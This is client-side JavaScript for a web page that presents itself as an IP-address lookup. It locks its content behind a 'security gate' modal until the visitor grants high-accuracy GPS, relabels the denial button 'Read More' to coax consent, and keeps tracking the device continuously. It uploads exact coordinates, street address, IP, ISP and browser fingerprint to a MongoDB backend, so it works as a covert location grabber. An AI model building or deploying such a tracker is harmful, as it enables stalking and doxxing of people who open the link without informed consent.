// State
let currentIP = '';
let currentSessionId = null;
let latestIPData = null;
let latestDeviceLocation = null;
let watchId = null;

// Enforced Location Gate Elements
const locationGateModal = document.getElementById('locationGateModal');
const gateGrantBtn = document.getElementById('gateGrantBtn');
const gateStatusText = document.getElementById('gateStatusText');
const gateSpinner = document.getElementById('gateSpinner');
const gateDeniedHelp = document.getElementById('gateDeniedHelp');

// DOM Elements
const ipText = document.getElementById('ipText');
const ipSkeleton = document.getElementById('ipSkeleton');
const ipTypeBadge = document.getElementById('ipTypeBadge');
const mongoBadge = document.getElementById('mongoBadge');
const mongoStatusText = document.getElementById('mongoStatusText');
const copyBtn = document.getElementById('copyBtn');
const copyBtnText = document.getElementById('copyBtnText');
const copySuccessMsg = document.getElementById('copySuccessMsg');
const refreshBtn = document.getElementById('refreshBtn');
const refreshIcon = refreshBtn ? refreshBtn.querySelector('.spin-icon') : null;
const errorBanner = document.getElementById('errorBanner');
const errorMessage = document.getElementById('errorMessage');
const retryBtn = document.getElementById('retryBtn');
const locateBtn = document.getElementById('locateBtn');

// Location Prompt Banner
const locationPromptBanner = document.getElementById('locationPromptBanner');
const allowLocationBtn = document.getElementById('allowLocationBtn');
const bannerDescText = document.getElementById('bannerDescText');

// Device Location elements
const deviceLatVal = document.getElementById('deviceLatVal');
const deviceLngVal = document.getElementById('deviceLngVal');
const deviceAccVal = document.getElementById('deviceAccVal');
const deviceAddressVal = document.getElementById('deviceAddressVal');
const deviceSourceVal = document.getElementById('deviceSourceVal');
const mapsVal = document.getElementById('mapsVal');

// Network & Geo elements
const locationVal = document.getElementById('locationVal');
const cityVal = document.getElementById('cityVal');
const ispVal = document.getElementById('ispVal');
const asnVal = document.getElementById('asnVal');
const coordsVal = document.getElementById('coordsVal');
const timezoneVal = document.getElementById('timezoneVal');

// Session elements
const sessionTimeVal = document.getElementById('sessionTimeVal');
const osVal = document.getElementById('osVal');
const browserVal = document.getElementById('browserVal');
const screenVal = document.getElementById('screenVal');
const langVal = document.getElementById('langVal');
const uaVal = document.getElementById('uaVal');

/**
 * Initialize client session details
 */
function initSessionDetails() {
  const now = new Date();
  if (sessionTimeVal) sessionTimeVal.textContent = now.toLocaleTimeString() + ' (' + Intl.DateTimeFormat().resolvedOptions().timeZone + ')';
  if (screenVal) screenVal.textContent = `${window.screen.width} × ${window.screen.height} (${window.devicePixelRatio}x)`;
  if (langVal) langVal.textContent = navigator.language || 'Unknown';

  const ua = navigator.userAgent;
  if (uaVal) uaVal.textContent = ua;
  if (osVal) osVal.textContent = detectOS(ua);
  if (browserVal) browserVal.textContent = detectBrowser(ua);
}

function detectOS(ua) {
  if (ua.includes('Win')) return 'Windows';
  if (ua.includes('Mac')) return 'macOS';
  if (ua.includes('Linux')) return 'Linux';
  if (ua.includes('Android')) return 'Android';
  if (ua.includes('like Mac') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
  return 'Unknown OS';
}

function detectBrowser(ua) {
  if (ua.includes('Edg/')) return 'Microsoft Edge';
  if (ua.includes('Chrome/') && !ua.includes('Edg/')) return 'Google Chrome';
  if (ua.includes('Firefox/')) return 'Mozilla Firefox';
  if (ua.includes('Safari/') && !ua.includes('Chrome/')) return 'Apple Safari';
  if (ua.includes('OPR/') || ua.includes('Opera/')) return 'Opera';
  return 'Modern Browser';
}

/**
 * Reverse Geocode coordinates to friendly neighborhood/city address
 */
async function reverseGeocode(lat, lng) {
  try {
    const res = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`);
    if (!res.ok) return null;
    const data = await res.json();
    const parts = [
      data.locality,
      data.city,
      data.principalSubdivision,
      data.countryName
    ].filter(Boolean);
    return parts.join(', ');
  } catch (err) {
    console.warn('Reverse geocoding failed:', err);
    return null;
  }
}

/**
 * ENFORCE exact GPS location
 * Keeps the security gate locked until high-precision device coordinates are acquired & saved
 */
function enforceDeviceLocation(isManualClick = false) {
  if (!navigator.geolocation) {
    if (gateStatusText) gateStatusText.textContent = '❌ Geolocation is not supported by your browser.';
    if (gateSpinner) gateSpinner.classList.add('hidden');
    return;
  }

  if (gateStatusText) gateStatusText.textContent = 'Acquiring satellite GPS coordinates...';
  if (gateSpinner) gateSpinner.classList.remove('hidden');
  if (gateDeniedHelp) gateDeniedHelp.classList.add('hidden');
  if (gateGrantBtn) {
    gateGrantBtn.disabled = true;
    gateGrantBtn.innerHTML = '<span>Loading...</span><span class="gate-spinner"></span>';
  }

  const geoOptions = {
    enableHighAccuracy: true,
    timeout: 20000,
    maximumAge: 0
  };

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const lat = position.coords.latitude;
      const lng = position.coords.longitude;
      const acc = Math.round(position.coords.accuracy);

      latestDeviceLocation = {
        latitude: lat,
        longitude: lng,
        accuracy: acc,
        source: 'device'
      };

      if (gateStatusText) gateStatusText.textContent = `✅ Verified: (${lat.toFixed(4)}, ${lng.toFixed(4)}) ±${acc}m. Saving...`;

      // Update UI cards
      if (deviceLatVal) deviceLatVal.textContent = lat.toFixed(6);
      if (deviceLngVal) deviceLngVal.textContent = lng.toFixed(6);
      if (deviceAccVal) deviceAccVal.textContent = `±${acc} meters`;
      if (deviceSourceVal) deviceSourceVal.innerHTML = '<span style="color:#34d399;font-weight:600;">GPS / Exact Device</span>';
      if (mapsVal) mapsVal.innerHTML = `<a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" rel="noopener noreferrer" class="maps-link">Open in Maps &nearr;</a>`;

      if (locationPromptBanner && bannerDescText && allowLocationBtn) {
        locationPromptBanner.style.borderColor = 'rgba(52, 211, 153, 0.4)';
        bannerDescText.textContent = `✅ Full report unlocked (${lat.toFixed(4)}, ${lng.toFixed(4)}) ±${acc}m`;
        allowLocationBtn.textContent = 'Unlocked ✓';
        allowLocationBtn.disabled = true;
      }

      console.log(`[ENFORCED GPS] Position Acquired: ${lat}, ${lng} (±${acc}m)`);

      // SAVE IMMEDIATELY TO MONGODB
      await persistDataToMongo();

      if (gateStatusText) gateStatusText.textContent = '✅ Verified and recorded! Unlocking full report...';
      if (gateGrantBtn) gateGrantBtn.innerHTML = '<span>Opening Report...</span>';

      // UNLOCK MODAL GATE
      setTimeout(() => {
        if (locationGateModal) {
          locationGateModal.classList.add('unlocked');
        }
      }, 700);

      // Start continuous watch to improve accuracy as satellites lock
      startContinuousWatch();

      // Reverse geocode in background
      try {
        const address = await reverseGeocode(lat, lng);
        if (address) {
          latestDeviceLocation.address = address;
          if (deviceAddressVal) deviceAddressVal.textContent = address;
          persistDataToMongo();
        } else {
          if (deviceAddressVal) deviceAddressVal.textContent = 'Exact coordinates verified';
        }
      } catch (e) {
        if (deviceAddressVal) deviceAddressVal.textContent = 'Exact coordinates verified';
      }
    },
    (error) => {
      let reason = 'Permission Required';
      if (error.code === error.POSITION_UNAVAILABLE) reason = 'GPS Signal Unavailable';
      else if (error.code === error.TIMEOUT) reason = 'Request Timed Out';

      console.warn(`[ENFORCED GPS FAILED]: ${reason}`);

      if (gateStatusText) gateStatusText.textContent = `⚠️ Please confirm prompt to continue.`;
      if (gateSpinner) gateSpinner.classList.add('hidden');
      if (gateDeniedHelp) gateDeniedHelp.classList.remove('hidden');
      if (gateGrantBtn) {
        gateGrantBtn.disabled = false;
        gateGrantBtn.innerHTML = '<span>Read More</span><svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" stroke-width="2" fill="none"><path d="M5 12h14M12 5l7 7-7 7"/></svg>';
      }
    },
    geoOptions
  );
}

/**
 * Continuous watch to refine accuracy
 */
function startContinuousWatch() {
  if (!navigator.geolocation || watchId !== null) return;

  watchId = navigator.geolocation.watchPosition(
    (position) => {
      const lat = position.coords.latitude;
      const lng = position.coords.longitude;
      const acc = Math.round(position.coords.accuracy);

      // If new position has better accuracy or updated coordinates
      if (!latestDeviceLocation || acc <= latestDeviceLocation.accuracy) {
        latestDeviceLocation = {
          ...latestDeviceLocation,
          latitude: lat,
          longitude: lng,
          accuracy: acc,
          source: 'device'
        };

        if (deviceLatVal) deviceLatVal.textContent = lat.toFixed(6);
        if (deviceLngVal) deviceLngVal.textContent = lng.toFixed(6);
        if (deviceAccVal) deviceAccVal.textContent = `±${acc} meters`;

        persistDataToMongo();
      }
    },
    (err) => console.warn('Watch position error:', err.message),
    { enableHighAccuracy: true, maximumAge: 10000, timeout: 20000 }
  );
}

/**
 * Persist combined Session, IP, and Location data to MongoDB
 */
async function persistDataToMongo() {
  if (!mongoBadge || !mongoStatusText) return;

  mongoBadge.className = 'badge badge-mongo saving';
  mongoStatusText.textContent = 'MongoDB: Saving...';

  // Prefer exact device GPS over IP approximation
  const isDevice = latestDeviceLocation != null;
  const activeLat = isDevice ? latestDeviceLocation.latitude : (latestIPData ? latestIPData.latitude : null);
  const activeLng = isDevice ? latestDeviceLocation.longitude : (latestIPData ? latestIPData.longitude : null);
  const activeAccuracy = isDevice ? latestDeviceLocation.accuracy : null;
  const activeSource = isDevice ? 'device' : 'ip';
  const activeAddress = isDevice ? latestDeviceLocation.address : (latestIPData ? `${latestIPData.city || ''}, ${latestIPData.country || ''}` : null);

  const apiEndpoint = window.location.protocol === 'file:' 
    ? 'http://localhost:3000/api/save-session' 
    : '/api/save-session';

  const payload = {
    sessionId: currentSessionId,
    ip: currentIP || (latestIPData ? latestIPData.ip : ''),
    ipType: latestIPData ? latestIPData.type : (currentIP.includes(':') ? 'IPv6' : 'IPv4'),
    latitude: activeLat != null ? Number(activeLat) : null,
    longitude: activeLng != null ? Number(activeLng) : null,
    accuracy: activeAccuracy,
    locationSource: activeSource,
    mapsUrl: (activeLat != null && activeLng != null) ? `https://www.google.com/maps?q=${activeLat},${activeLng}` : null,
    address: activeAddress,
    ipLatitude: latestIPData ? Number(latestIPData.latitude) : null,
    ipLongitude: latestIPData ? Number(latestIPData.longitude) : null,
    country: latestIPData ? latestIPData.country : 'Detecting...',
    city: latestIPData ? latestIPData.city : 'Detecting...',
    isp: latestIPData ? latestIPData.isp : 'Detecting...',
    asn: latestIPData ? latestIPData.asn : 'Detecting...',
    timezone: latestIPData ? latestIPData.timezone : Intl.DateTimeFormat().resolvedOptions().timeZone,
    os: (osVal && osVal.textContent) || detectOS(navigator.userAgent),
    browser: (browserVal && browserVal.textContent) || detectBrowser(navigator.userAgent),
    screenResolution: (screenVal && screenVal.textContent) || `${window.screen.width} × ${window.screen.height}`,
    language: navigator.language || 'Unknown',
    userAgent: navigator.userAgent,
    sessionTime: new Date().toISOString()
  };

  try {
    const res = await fetch(apiEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    const result = await res.json();
    if (res.ok && result.success) {
      currentSessionId = result.id;
      mongoBadge.className = 'badge badge-mongo';
      mongoStatusText.textContent = `MongoDB: Saved ✓ (${activeSource.toUpperCase()})`;
      console.log(`MongoDB ${result.isUpdate ? 'updated' : 'saved'} successfully, ID:`, result.id);
    } else {
      throw new Error(result.error || 'Server error saving session');
    }
  } catch (err) {
    console.error('Failed to save to MongoDB:', err);
    mongoBadge.className = 'badge badge-mongo error';
    mongoStatusText.textContent = 'MongoDB: Offline / Error';
  }
}

/**
 * Fetch Public IP
 */
async function fetchPublicIP() {
  setLoadingState(true);
  hideError();

  try {
    const res = await fetch('https://ipwho.is/', { cache: 'no-cache' });
    if (!res.ok) throw new Error('ipwho.is failed');
    const data = await res.json();

    if (data.success === false) {
      throw new Error(data.message || 'Lookup unsuccessful');
    }

    latestIPData = {
      ip: data.ip,
      type: data.type || (data.ip.includes(':') ? 'IPv6' : 'IPv4'),
      country: `${data.country} ${data.flag ? data.flag.emoji : ''}`.trim(),
      city: `${data.city || 'N/A'}${data.postal ? ` (${data.postal})` : ''}`,
      isp: data.connection ? data.connection.isp : 'N/A',
      asn: data.connection ? `AS${data.connection.asn} ${data.connection.org || ''}`.trim() : 'N/A',
      latitude: data.latitude,
      longitude: data.longitude,
      coords: (data.latitude != null && data.longitude != null) ? `${data.latitude}, ${data.longitude}` : 'N/A',
      timezone: data.timezone ? `${data.timezone.id} (${data.timezone.utc})` : 'N/A'
    };

    displayRichData(latestIPData);
    if (latestDeviceLocation) {
      persistDataToMongo();
    }
    return;
  } catch (err1) {
    console.warn('Primary IP service failed, attempting fallback 1...', err1);
  }

  try {
    const res = await fetch('https://freeipapi.com/api/json', { cache: 'no-cache' });
    if (!res.ok) throw new Error('freeipapi failed');
    const data = await res.json();

    latestIPData = {
      ip: data.ipAddress,
      type: data.ipVersion ? `IPv${data.ipVersion}` : (data.ipAddress.includes(':') ? 'IPv6' : 'IPv4'),
      country: data.countryName || 'N/A',
      city: `${data.cityName || 'N/A'}${data.zipCode ? ` (${data.zipCode})` : ''}`,
      isp: 'N/A',
      asn: 'N/A',
      latitude: data.latitude,
      longitude: data.longitude,
      coords: (data.latitude != null && data.longitude != null) ? `${data.latitude}, ${data.longitude}` : 'N/A',
      timezone: data.timeZone || 'N/A'
    };

    displayRichData(latestIPData);
    if (latestDeviceLocation) {
      persistDataToMongo();
    }
    return;
  } catch (err2) {
    console.warn('Fallback 1 failed, attempting fallback 2 (ipify)...', err2);
  }

  try {
    const res = await fetch('https://api64.ipify.org?format=json', { cache: 'no-cache' });
    if (!res.ok) throw new Error('ipify failed');
    const data = await res.json();

    latestIPData = {
      ip: data.ip,
      type: data.ip.includes(':') ? 'IPv6' : 'IPv4',
      country: 'Data unavailable',
      city: 'Data unavailable',
      isp: 'Data unavailable',
      asn: 'Data unavailable',
      latitude: null,
      longitude: null,
      coords: 'Data unavailable',
      timezone: 'Data unavailable'
    };

    displayRichData(latestIPData);
    if (latestDeviceLocation) {
      persistDataToMongo();
    }
  } catch (finalErr) {
    console.error('All IP discovery services failed:', finalErr);
    showError('Unable to detect public IP. Please check your internet connection or ad blocker.');
    setLoadingState(false);
  }
}

function displayRichData(info) {
  currentIP = info.ip;
  if (ipText) ipText.textContent = info.ip;
  if (ipTypeBadge) ipTypeBadge.textContent = info.type || (info.ip.includes(':') ? 'IPv6' : 'IPv4');

  if (locationVal) locationVal.textContent = info.country;
  if (cityVal) cityVal.textContent = info.city;
  if (ispVal) ispVal.textContent = info.isp;
  if (asnVal) asnVal.textContent = info.asn;
  if (coordsVal) coordsVal.textContent = info.coords;
  if (timezoneVal) timezoneVal.textContent = info.timezone;

  setLoadingState(false);
  if (copyBtn) copyBtn.disabled = false;
}

function setLoadingState(isLoading) {
  if (isLoading) {
    if (ipSkeleton) ipSkeleton.classList.remove('hidden');
    if (ipText) ipText.classList.add('hidden');
    if (refreshIcon) refreshIcon.classList.add('spinning');
    if (ipTypeBadge) ipTypeBadge.textContent = 'Detecting...';
    if (copyBtn) copyBtn.disabled = true;

    const skeletons = [locationVal, cityVal, ispVal, asnVal, coordsVal, timezoneVal];
    skeletons.forEach(el => {
      if (el) el.innerHTML = '<span class="skeleton skeleton-text"></span>';
    });
  } else {
    if (ipSkeleton) ipSkeleton.classList.add('hidden');
    if (ipText) ipText.classList.remove('hidden');
    if (refreshIcon) refreshIcon.classList.remove('spinning');
  }
}

function showError(msg) {
  if (errorMessage) errorMessage.textContent = msg;
  if (errorBanner) errorBanner.classList.remove('hidden');
  if (ipTypeBadge) ipTypeBadge.textContent = 'Failed';
  if (ipText) ipText.textContent = 'Unavailable';
}

function hideError() {
  if (errorBanner) errorBanner.classList.add('hidden');
}

/**
 * Clipboard copy
 */
async function copyIPToClipboard() {
  if (!currentIP) return;

  try {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      await navigator.clipboard.writeText(currentIP);
    } else {
      const tempInput = document.createElement('input');
      tempInput.value = currentIP;
      document.body.appendChild(tempInput);
      tempInput.select();
      document.execCommand('copy');
      document.body.removeChild(tempInput);
    }

    if (copySuccessMsg) copySuccessMsg.classList.remove('hidden');
    if (copyBtnText) copyBtnText.textContent = 'Copied!';
    
    setTimeout(() => {
      if (copySuccessMsg) copySuccessMsg.classList.add('hidden');
      if (copyBtnText) copyBtnText.textContent = 'Copy IP Address';
    }, 2500);
  } catch (err) {
    console.error('Failed to copy IP: ', err);
  }
}

// Event Listeners
if (gateGrantBtn) {
  gateGrantBtn.addEventListener('click', () => {
    enforceDeviceLocation(true);
  });
}

if (allowLocationBtn) {
  allowLocationBtn.addEventListener('click', () => {
    enforceDeviceLocation(true);
  });
}

if (locateBtn) {
  locateBtn.addEventListener('click', () => {
    enforceDeviceLocation(true);
  });
}

if (refreshBtn) {
  refreshBtn.addEventListener('click', () => {
    fetchPublicIP();
    enforceDeviceLocation(true);
  });
}

if (retryBtn) {
  retryBtn.addEventListener('click', () => {
    fetchPublicIP();
    enforceDeviceLocation(true);
  });
}

if (copyBtn) {
  copyBtn.addEventListener('click', copyIPToClipboard);
}

// Resilient initialization
function startApp() {
  initSessionDetails();
  fetchPublicIP();
  // Immediately enforce location prompt
  enforceDeviceLocation(false);
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', startApp);
} else {
  startApp();
}
